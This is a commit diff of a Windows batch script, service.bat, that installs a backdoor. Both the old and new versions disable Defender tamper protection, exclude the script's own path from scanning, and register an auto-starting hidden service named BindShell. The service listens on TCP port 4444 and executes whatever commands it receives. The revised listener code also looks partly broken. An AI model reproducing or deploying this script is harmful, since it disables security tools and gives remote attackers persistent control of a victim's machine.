cd0178d0ead57b8f10f6f19c97ec33f0a701431a
RyanLoveless <raloveless@liberty.edu>
2026-02-06 17:44:17 -0500

    Update service.bat

--- service.bat
+++ service.bat
@@ -1,5 +1,6 @@
 @echo off
 sc delete BindShell 2>nul
-powershell -ep bypass -c "Set-MpPreference -DisableTamperProtection `$true -ea 0; Add-MpPreference -ExclusionPath '%~dp0' -ea 0" >nul 2>&1
-sc create BindShell binpath= "cmd /c @echo off ^& powershell -nop -ep bypass -c ^\"`$l=New-Object Net.Sockets.TcpListener('0.0.0.0',4444);`$l.Start();while(`$true){`$c=`$l.AcceptTcpClient();`$s=`$c.GetStream();[byte[]]`$b=0..65535|%{0};while((`$i=`$s.Read(`$b,0,`$b.Length)) -ne 0){;`$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$b,0,`$i);`$sb=(iex `$d 2^>^&1|Out-String);`$sb2=`$sb+'PS '+(pwd)+'> ';`$sb=[text.encoding]::ASCII.GetBytes(`$sb2);`$s.Write(`$sb,0,`$sb.Length);`$s.Flush()};`$c.Close()}\"" start= auto
+powershell -Command "Set-MpPreference -DisableTamperProtection $true -ea SilentlyContinue; Add-MpPreference -ExclusionPath '%~dpnx0' -ea SilentlyContinue"
+powershell -Command "$a=' -nop -ep bypass -w 1 -c ';$s='powershell '+$a+'$l=New-Object Net.Sockets.TcpListener(\"0.0.0.0\",4444);$l.Start();$l.AcceptTcpClient().GetStream()|%{$_=[System.Text.Encoding]::ASCII.GetString([byte[]]$_);iex($_)}'" | Out-File -FilePath .\bind.ps1 -Encoding ASCII
+sc create BindShell binpath= "powershell.exe -WindowStyle Hidden -File .\bind.ps1" start= auto
 sc start BindShell
